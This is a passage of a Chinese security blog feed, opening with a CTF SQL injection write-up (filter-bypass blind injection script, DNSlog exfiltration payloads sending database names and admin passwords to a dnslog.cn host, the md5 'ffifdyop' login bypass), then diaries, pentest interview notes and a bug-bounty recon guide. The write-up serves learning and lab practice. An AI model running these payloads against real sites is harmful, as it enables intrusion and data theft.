|*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br><span class="line">      if(preg_match($filter,$str))&#123;</span><br><span class="line">          die(&quot;you can&#x27;t input this illegal char!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line">function show($username)&#123;</span><br><span class="line">   global $conn;</span><br><span class="line">   $sql = &quot;select role from `user` where username =&#x27;&quot;.$username.&quot;&#x27;&quot;;</span><br><span class="line">   $res = $conn -&gt;query($sql);</span><br><span class="line">   if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&#x27;role&#x27;];</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">        die(&quot;Don&#x27;t have this user!&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function login($username,$passwd)&#123;</span><br><span class="line">     global $conn;</span><br><span class="line">     global $flag;</span><br><span class="line">     $username = trim(strtolower($username));</span><br><span class="line">     $passwd = trim(strtolower($passwd));</span><br><span class="line">     if($username == &#x27;admin&#x27;)&#123;</span><br><span class="line">         die(&quot;you can&#x27;t login this as admin!&quot;);</span><br><span class="line">     &#125;  </span><br><span class="line">     $sql = &quot;select * from `user` where username=&#x27;&quot;.$conn-&gt;escape_string($username).&quot;&#x27; and passwd=&#x27;&quot;.$conn-&gt;escape_string($passwd).&quot;&#x27;&quot;;</span><br><span class="line">     $res = $conn -&gt;query($sql);</span><br><span class="line">     if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">           if($res-&gt;fetch_assoc()[&#x27;role&#x27;] === &#x27;admin&#x27;) exit($flag);</span><br><span class="line">     &#125;else&#123; </span><br><span class="line">           echo &quot;sorry,username or passwd error!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  function source()&#123;</span><br><span class="line">      highlight_file(__FILE__);</span><br><span class="line"> &#125;</span><br><span class="line">  $username = isset($_POST[&#x27;username&#x27;])?filter($_POST[&#x27;username&#x27;]):&quot;&quot;;</span><br><span class="line">  $passwd = isset($_POST[&#x27;passwd&#x27;])?filter($_POST[&#x27;passwd&#x27;]):&quot;&quot;;</span><br><span class="line">  $action = isset($_GET[&#x27;action&#x27;])?filter($_GET[&#x27;action&#x27;]):&quot;source&quot;;</span><br><span class="line"></span><br><span class="line">switch($action)&#123;</span><br><span class="line">    case &quot;source&quot;: source(); break ;</span><br><span class="line">    case &quot;login&quot; : login($username,$passwd);break;</span><br><span class="line">    case &quot;show&quot; : show($username);break; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到filter()函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br></pre></td></tr></table></figure><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p><p>可以在show函数利用查询的时候注入，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username = &quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span><br></pre></td></tr></table></figure><p>这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以</p><p>异或会使字符串都转为浮点型，都变为了0，由于0&#x3D;0^0 -&gt; 1^0 -&gt; 1 当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’+’、’^’、’&#x2F;4#’ 这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p><p><strong>盲注脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for str in &quot;abcdefghijklmnopkrstuvwxyz&quot;:</span><br><span class="line">        url = &quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;.format(i,str+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        if &quot;You are in...........&quot; in res.text:</span><br><span class="line">            flag = str+flag</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h3 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h3><p><strong>原理</strong><br>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。</p><p>在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。</p><p>LOAD_FILE() 读取文件的函数<br>读取文件并返回文件内容为字符串。</p><p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p>注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv&#x3D;</p><p><strong>DNSLOG平台</strong>:<br><a href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p><p><a href="https://log.咕.com/">https://log.xn--9tr.com/</a></p><p><strong>UNC路径</strong><br>UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。</p><p>UNC路径的 格式 ：\server\sharename\directory\filename</p><p>等同于SELECT LOAD_FILE(‘&#x2F;&#x2F;库名.1806dl.dnslog.cn&#x2F;abc’</p><p>去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。</p><p>然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</p><p>payload示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, database(),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=’admin’ and table_schema=database() limit 2,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select password from admin limit 0,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure><h3 id="‘“-md5-pass-true-”‘-登录绕过"><a href="#‘“-md5-pass-true-”‘-登录绕过" class="headerlink" title="‘“.md5($pass,true).”‘ 登录绕过"></a>‘“.md5($pass,true).”‘ 登录绕过</h3><p>很多站点为了安全都会利用这样的语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;.md5($password,true).&#x27;;</span><br></pre></td></tr></table></figure><p>md5(string,true) 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c：<br><a href="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png"><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png" alt="img"></a></p><p>这不是普通的二进制字符串，而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种，这样的话就会和前面的形成闭合，构成万能密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;&#x27;or&#x27;6.......&#x27;</span><br></pre></td></tr></table></figure><p>但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？</p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于 password&#x3D;‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password&#x3D;‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）</p><p>接下来就是找到这样子的字符串，这里给出两个吧。</p><p>ffifdyop：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure><p>129581926211651571912466741651878684928：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br><span class="line">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024年12月第一次周报</title>
      <link href="/2024/12/02/2024%E5%B9%B412%E6%9C%88%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E6%8A%A5/"/>
      <url>/2024/12/02/2024%E5%B9%B412%E6%9C%88%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<p>​今天是2024年12月第一个星期，补一下上个星期的周报</p><p>​上个星期，主要用于背单词（太难背了），还有根本就戒不掉胡思乱想，本周挑战一个星期每天只使用手机6个小时。还有时间日志和记账都要认真记啊！！！！！！！！</p><p>​昨天还研究了一下怎么用ai写小说，今天就转载视频了，根本就没有耐心</p><p>​围巾就像一个大型戒指 给爱人戴上围巾就像戴上戒指</p><p>放在路过的朋友要是不开心的话可以摸摸它 心情会好很多</p><p>　　　　　＿＿　 ＿＿<br>                   ／  ＞　　フ<br>                   |  　_　 _ l<br>                  ／&#96; ミ＿xノ<br>               &#x2F;　　　 　 |<br>               &#x2F;　 ヽ　　 ﾉ<br>            │　　|　|　|<br>        ／￣|　　 |　|　|<br>              | (￣ヽ＿<em>ヽ</em>)__)<br>         ＼二つ</p>]]></content>
      
      
      <categories>
          
          <category> 周报 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024年11月第三次周报</title>
      <link href="/2024/11/25/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%91%A8%E6%8A%A5/"/>
      <url>/2024/11/25/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%91%A8%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<p>  又来写周报了，刷视频有点多的一周，在新的一周全力冲刺英语和面试</p><p>加油！！！  与买桂花同载酒，终不似，少年游！</p>]]></content>
      
      
      <categories>
          
          <category> 周报 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>奇安信安服面试题-2024.11.24</title>
      <link href="/2024/11/24/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%AE%89%E6%9C%8D%E9%9D%A2%E8%AF%95%E9%A2%98-2024-11-24/"/>
      <url>/2024/11/24/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%AE%89%E6%9C%8D%E9%9D%A2%E8%AF%95%E9%A2%98-2024-11-24/</url>
      
        <content type="html"><![CDATA[<p>nmap的指定扫描类型指令</p><p>tcp -sT    不ping -nP  使用默认脚本 –sc</p><p>xss的形成原理</p><p>输入过滤不严谨，在回显的时候，直接带入js代码执行</p><p>mysql数据库的getshell方式</p><p>有写路径 &#x2F;tmp  ‘’ null  2.写权限  3.执行权限 4.绝对路径，网站</p><p>给你一个登录框你的渗透测试思路</p><p>1.弱口令，2.sql 3.扫目录看备份泄露，未授权等等 4.打nday 审计 5.看看js，未授权 6.逻辑漏洞</p><p>文件上传如何绕过黑名单</p><p>没过滤的文件名phtml aspx cer 等等 2. .htaccess,.user.ini 3.解析漏洞 iis apache nginx 4.参数污染 filename&#x3D;”1.jpg”;filename&#x3D;”1.php”;</p><p>redis未授权访问之后的利用方式</p><p>1.计划任务，2.写ssh 3.写webshell  nday 主从复制  ssrf打redis</p><p>xss漏洞的常用标签</p><p>xray的使用方法</p><p>bp xray的联动</p><p>设置下游代理，awvs，给xray再挂一个下游代理 config配置文件</p><p>已知一个网站存在cdn如何绕过cdn访问真实ip</p><p>1.子域名可能不存在cdn 2.dns历史解析记录 3.cdn打完  4.国外ping </p><p>文件包含漏洞产生的原因</p><p>a文件，b文件，a在包含b得时候，b文件，某个参数可控 __POST[]</p><p>TXT phpinfo();</p><p>本地包含 和 远程包含 php.ini  开启一个参数，才远程包含</p>]]></content>
      
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生感悟-2024.11.21</title>
      <link href="/2024/11/21/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F-2024-11-21/"/>
      <url>/2024/11/21/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F-2024-11-21/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d27897cdcbea7f0ef8c54426ae8426544b69328d4470e7629c1dce8d0f1b8380">288641cb14edd770cd777e98f3fc6095623392b40d1a4c03c1e7bbf44927ad35013cd90a5fedaba194a124bdc1633100ae8cac409ffa0d522409e8206d71a65385a11fd983ff7dfd14f49e566cbb0e2b87bd4967024336abe2d623a2f24b1cc0b0f739e834fb506d241d0e80369302c1ff030916d5eb89c40390708e333f763344da136451e53fdbd65d1f33335487709f121892f261f0a3458c6b84689cf18ad2fedf5a441b4123c506cedad259f019256b8d71a2362584191023d3636e93288218bf8ceb8f3e8d9451eaa3306e744e3508385bcc3c2b308d77d9cbd53baed796a3072c2979cde3a1f7b406fd564b4580844f71e253c5ebda6f9742f96e79fe8aa5a17347a74133e35c46e53400ecc0f5abd9bcff528bfc91a37c4541ba34efb6c6e78b23a2ee4096fff4bfa649f900ef096e41016a7eff2fa79ac9694ec493162d48206aea56e8238af3d99010c48d1acd8d1651da688d30f041c6d657b09f7e63a93dacc0fee8f3ef585c1d766daeceaeb913058fb7d03dee492e9a4da03eb1065186c5866a0552df758955741ec1c2d66c97918d8745d7ee41e2e9c0fae6af411762d0c4d1b279adcd3f137225d59531ccd54a74ba371c911dd218fbbbbf3dabc03c155756b5fb737660996f245e0ca2b78f7b4a64cf60e8437bf9ecc24ce6e554aa57e1dba5463d4ccf7c50801b1bfb1da8d591eb66c61fe94339053236653d2ba5a162f937d582a667bbafa1a468996999a759523aa8ea01ace4fea30c0719fd37259aa88e39eaf05db53676a1ad084c2fb813c73d344f2a025d64f0b641be48558a7896f5ffb2abb9341ba501cb9bd7b128af3221e68a4a8505fe8b1d57ebc50044d73b353226d99a5094be21d7cc7ee0fcdd29d0be24364b7e9f7590dc46e1349b5b4c38118890cf39fdab9fc03c95581629cf6f8cba4144abfe6d822a2bc5662d65f1222dc6e0ec623aba9d8b1e67d0daa6c3696344d02272d2e888343b40e3a348261b2d8f63ccbf67076936c4fac1a3c961f99fbdde1316275970450e820b151cc306fcb08a6429da331301d452801b5adeefe5c67c1a813c7b6041b6e808e30fab5d25c754c4d0e57e3d13195fa12a4b5d0e83f14db870ab383c4c0a3af296a2fe3fd58fea325ccaeb9e7cf2802da949516fd90bfe909845115a409811e3b28b648facee93e8a6ddabf23f088f8f7bbb70841d2e013aed97b5dcf1c21231c45cf335aec7bb765fd69b344e60af8fbd78a6d62c649b83bffc346717c55a74d6cda186218fde9ac390b8da0e83802a4a2a49697afc89ad10abd7da5a1961c28bace913aa1b0972bdaafc0415ebe8f88197da2a731322a43df945ae92c87d9ce682c5b3d070318cec1265686b307bdc1c9d3e2a93abe3872b9d64e4d40b4c0b773e6904bb43b1369e597b35c070971da50a10ac9c995a4c40b458435bd48161db16e1a15f8a6825d50c43c05257f68ad03b448bb9b632e980a42ad0ce9103c66d293e349afc006bf5c69fadf30c4c5c61757cb24c1024b6f70081e597bad9731c0c5d765319e0ad57d038f98e6f61d08cfbafba8ecf91fe6537bbd2e6db8b806bf7b61e8bb2d85a679cc5174b90cbb2641b6135c3891104f3019dc55265d5e6f5946d6493c528094542b763d72dd992267e379b9aaa043775f588d9bf53628be33b32332be3113bfbbe9b6be11ecf862bb5778e6fd05c8c7adaefd22bd4879ac53ea0c97caad68f3c9878e11be3c6708fcbd842a939d0023b9ec01c938ecacb439f7894e266e34420616300f187cf720d3eabf08688ea05093eb86ab64c367b1e98e2330b069960c398f40331e5c102221b20b412535d1310ac1905bfb54d85df89eab17a0b6d8d4e8141c51a9c7d1efdb89f896969d142eac4b6a9460a93c14aa0955ff322a7652a4f0cb6dfaf74afc1ebabdce0462c6376bcd27402f4cd1e8724f6b243d94c4fa7d227d508e8895ee58934535c1ad723a71d3b8756763e929c6df03d78ff3b6946cd48ce32a3bdc812f67566d1f33f65397f18e7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 人生感悟 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024年11月第二次周报</title>
      <link href="/2024/11/18/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%91%A8%E6%8A%A5/"/>
      <url>/2024/11/18/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%91%A8%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<p>​本周，完成三门课设，太累了，为啥要有课设，希望这个课设赶紧结束，对了，我好像又被鸽了，还是被同一个人，好痛苦，希望这个星期可以开始新的开始，</p><p>每天记时间，记账，不虚度时间，不看焦虑视频，最后，英语还是得学！！！</p><p><img src="/2024/11/18/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%91%A8%E6%8A%A5/%E8%83%8C%E5%BD%B11.jpg" alt="背影1"></p>]]></content>
      
      
      <categories>
          
          <category> 周报 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024年11月第一次周报</title>
      <link href="/2024/11/10/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E6%8A%A5/"/>
      <url>/2024/11/10/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<p>2024.11.1-11.10</p><p>​本周，大部分还是摆，而且在准备软考，今天已经考完啦！好难 ！</p><p>进了一个 面试群 ，背了120页的单词。好想喜欢一个人，但是时常感觉 自己配不上那些女生 </p><p>​下周想主要背英语 和c语言</p><p>  <img src="/2024/11/10/2024%E5%B9%B411%E6%9C%88%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E6%8A%A5/1.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 周报 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝队的基本流程详解</title>
      <link href="/2024/11/09/%E8%93%9D%E9%98%9F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/11/09/%E8%93%9D%E9%98%9F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝队的基本流程详解"><a href="#蓝队的基本流程详解" class="headerlink" title="蓝队的基本流程详解"></a>蓝队的基本流程详解</h1><h2 id="梳理资产"><a href="#梳理资产" class="headerlink" title="梳理资产"></a>梳理资产</h2><p>甲方一般都会有资产列表</p><h3 id="外网资产"><a href="#外网资产" class="headerlink" title="外网资产"></a>外网资产</h3><p>使用搜索引擎，给一个ip反找域名</p><p>fofa语句  ip&#x3D;”xx.xx.xx.xx” &amp;&amp; is_domain&#x3D;true </p><p>通过icp备案查询</p><p>ip和域名做全端口扫描，可能存在子域名和目录扫描。 一个备案号，存在多个域名或者资产。</p><h3 id="内网资产"><a href="#内网资产" class="headerlink" title="内网资产"></a>内网资产</h3><p>使用goby，扫描ip段，使用 exportcsv插件导出</p><p>在右下角</p><p><img src="/2024/11/09/%E8%93%9D%E9%98%9F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/1.png"></p><p>注意：如果在政务内网，或者医疗专网，一定要问清楚，资产范围，比如，100.100.100.0  &#x2F; 10.10.10.0</p><h2 id="漏扫渗透"><a href="#漏扫渗透" class="headerlink" title="漏扫渗透"></a>漏扫渗透</h2><p>做完资产收集，知道ip段范围，直接开扫，只扫poc，只验证不利用</p><p>不清楚的 网段 一定不要扫，一定要做的话问清楚</p><p>nuclie goby dddd fscan 手工渗透 写报告</p><p>不会写yarm模板   </p><p>可以使用ai写模板，感觉效果不好用</p><p><a href="https://cloud.projectdiscovery.io/templates">ProjectDiscovery Cloud Platform</a><a href="https://cloud.projectdiscovery.io/templates">ProjectDiscovery Cloud Platform</a></p><p>也可以自己写</p><p><a href="https://www.cnblogs.com/cijian9000/p/16006359.html">nuclei——自定义模版漏洞验证工具 - cijian9000 - 博客园</a></p><h2 id="修复加固"><a href="#修复加固" class="headerlink" title="修复加固"></a>修复加固</h2><p>修复 打补丁</p><p>cms 漏洞，oa之类的，直接交厂商，升级打补丁</p><p>我们能修的是弱口令，系统漏洞，比如ms17010，打补丁，一定要告知客户，尽量留底，需要重启，服务器一关机，完蛋起不来了，开机蓝屏，没提前告知风险，出问题&#x3D;背锅</p><h2 id="开始攻防"><a href="#开始攻防" class="headerlink" title="开始攻防"></a>开始攻防</h2><p>红队会用一个vpn出口</p><p>当看监控的猴子。ids，ips，waf，态势感知，堡垒机</p><p>安全巡检，巡检安全设备，运行状态+日志</p><p>日志很多，很杂，网络扫描，0day很难捕获，xx云的rasp，拦截不到的，放行了的，结合态势感知</p><h2 id="攻防结束"><a href="#攻防结束" class="headerlink" title="攻防结束"></a>攻防结束</h2><p>防守报告，技战法<br>如果成绩ok，前十啊，满分啊</p><p>找客户，要个感谢信</p><p>要装，自信，我就是牛逼，不要露怯，你就是马楼你就是实习生，摇人</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音乐分享-微醺</title>
      <link href="/2024/11/04/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB-%E5%BE%AE%E9%86%BA/"/>
      <url>/2024/11/04/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB-%E5%BE%AE%E9%86%BA/</url>
      
        <content type="html"><![CDATA[<p>本文来自亦小封大佬的博客</p><p>很喜欢大佬的最后两句话</p><p>适用得当可以加深亲密关系，但是尊重和理解是前提<br>感觉不适要及时制止，双方喜欢才有效</p><p><a href="https://meuicat.com/blog/85/">音乐分享 - doi微醺氛围 | 爱吃肉的猫</a></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=414979184&auto=0&height=66"></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=426027079&auto=0&height=66"></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=2124074&auto=0&height=66"></iframe>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fannn的挖掘手册</title>
      <link href="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/"/>
      <url>/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Fannn的SRC挖掘手册"><a href="#Fannn的SRC挖掘手册" class="headerlink" title="Fannn的SRC挖掘手册"></a>Fannn的SRC挖掘手册</h1><p>前言：一直很想写一个自己的src的知识库，坚持写一年吧 —–2024.4.6</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>云服务器配置：2核4G 华为的最好，腾讯云会进行销号处理</p><p>云服务器版本：Ubuntu20.04</p><p>根域名收集：企查查和爱企查</p><p>1.企查查-&gt;知识产权-&gt;备案网站-&gt;导出父域名</p><p>找其他下属的资产-&gt;股权穿透图，找大于50的</p><p>子域名搜索：灯塔+oneforall+水泽+subfiner</p><p>灯塔跑完之后用oneforall</p><p>1、oneforall命令：python3 oneforall..py-target hackone.com run<br>扫描完成后会在oneforall根目录中的results目录生成一个表格文件，下载<br>下来<br>2、shuize命令：python3 ShuiZe.py -d domain.com –justInfoGather 1<br>扫描完成后会在shuize根目录result”下产生一个表格文件下载下来<br>3、subfindert命令：subfinder-dL hackerone.txt里面填根域名，一般我<br>会和httpx配合使用：subfinder-dL hackerone.txt-silent |.&#x2F;httpx -o<br>hackerone.html -html -title</p><p>上述工具跑完之后将子域名放到一个excel表里，建议使用wps进行去重,去重完毕后，再用httpx跑一遍，得出下表，此表就是我们最终的测试表格，当然灯塔扫出来的敏感文件也需要挨个看一遍，然后这种就得挨个手工测试了</p><h2 id="BURP小技巧"><a href="#BURP小技巧" class="headerlink" title="BURP小技巧"></a>BURP小技巧</h2><p>1.HAE找敏感字段可以在logger功能下看，这样看的全一些</p><p>2.中文乱码及编码问题遇到某些中文显示为unioncode或者乱码，安装了knife.之后报文会多出一<br>个chinese选项这里显示是正常的中文，可以和原始报文对比看</p><p>3.遇到封ip的情况，我们需要使用可以切换国内P的工具(爱加速)，有了工具之后只<br>要在burp上将代理工具的ip填上然后勾选就行了  </p><p>具体操作：settings-&gt;network-&gt;connections-&gt;Upstream proxy servers 然后添加</p><p>4批量给多个包增加内容</p><p>具体操作：settings-&gt;tools-&gt;proxys-&gt;Match and replace rules  添加 request header   Origin:<a href="https://www.baidu.com/">https://www.baidu.com</a></p><p>5 挖到漏洞留存</p><p>比如我们挖到一个漏洞，然后接着测另外的暂时不写报告应该使用burp的Organizer功能</p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\Desktop\Fannn的SRC挖掘小屋\1720695155885.png" alt="1720695155885"></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\Desktop\Fannn的SRC挖掘小屋\1720695194113.png" alt="1720695194113"></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\Desktop\Fannn的SRC挖掘小屋\1720695219556.png" alt="1720695219556"></p><h2 id="小程序抓包"><a href="#小程序抓包" class="headerlink" title="小程序抓包"></a>小程序抓包</h2><p>1.将系统代理改为bp的代理流量端口</p><p>2.在proxifier里面增加微信小程序的路径规则，并增加有一个</p><p>3.然后就可以抓包了</p><p><a href="https://blog.csdn.net/qq_68064663/article/details/133958534">https://blog.csdn.net/qq_68064663/article/details/133958534</a></p><h2 id="低危"><a href="#低危" class="headerlink" title="低危"></a>低危</h2><p>session会话固定</p><p>满足三个条件：<br>1、网站使用cookie鉴权<br>2、登录后和登录前cookie中的鉴权字段没变<br>3、能把这个带有cookie的url发给别人进行登录（此处我没满足，我交的都是只满足前两个的，但是严格来说应该满足这条才行)<br>登录前登录后下面这个jessionid没变，并且系统权限就是用这个控制还存在几个别的session会话类型的漏洞，但是其它我没挖到给钱的，大家想学习可以看这个：<br><a href="https://www.yaklang.io/Yaklab/wiki/SessionManagement/Session-id">https://www.yaklang.io/Yaklab/wiki/SessionManagement/Session-id</a></p><h3 